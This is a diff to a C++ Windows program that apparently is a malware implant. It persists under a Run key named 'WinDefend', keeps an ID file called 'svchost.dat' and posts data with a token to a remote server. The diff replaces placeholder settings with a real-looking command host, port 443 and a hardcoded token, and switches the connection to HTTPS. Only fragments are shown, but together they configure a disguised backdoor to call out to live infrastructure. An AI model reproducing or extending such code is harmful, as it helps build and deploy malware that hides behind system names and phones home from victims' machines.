@@ -25,12 +25,12 @@ static const std::string CFG_PATH = DIR + "\\config.ini";
 static const std::string ID_PATH  = DIR + "\\svchost.dat";
 static const std::string LOG_PATH = TempPath() + "run.log";
 
-static const char* DEFAULT_HOST  = "your-vps.example.net";
-static const int   DEFAULT_PORT  = 8080;
-static const char* DEFAULT_TOKEN = "CHANGE_ME_LONG_RANDOM";
+static const char* DEFAULT_HOST  = "aellee.pythonanywhere.com";
+static const int   DEFAULT_PORT  = 443;
+static const char* DEFAULT_TOKEN = "aF4tY8uJ6hG1dS3zq3nR7wL2vB5";
 static const char* RUN_KEY_NAME  = "WinDefend";
 
-struct Config { std::wstring host; int port = 8080; std::wstring token; };
+struct Config { std::wstring host; int port = 443; std::wstring token; };
 
 static std::string ReadFile(const std::string& path) {
     HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
@@ -368,7 +368,8 @@ static std::string HttpPost(const Config& c, const std::wstring& path,
     if (!s) return {};
     HINTERNET conn = WinHttpConnect(s, c.host.c_str(), (INTERNET_PORT)c.port, 0);
     HINTERNET req  = WinHttpOpenRequest(conn, L"POST", path.c_str(),
-        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
     std::wstring hdr = L"X-Token: " + c.token +
                        L"\r\nContent-Type: application/json";
     WinHttpSendRequest(req, hdr.c_str(), -1, (LPVOID)body.data(),
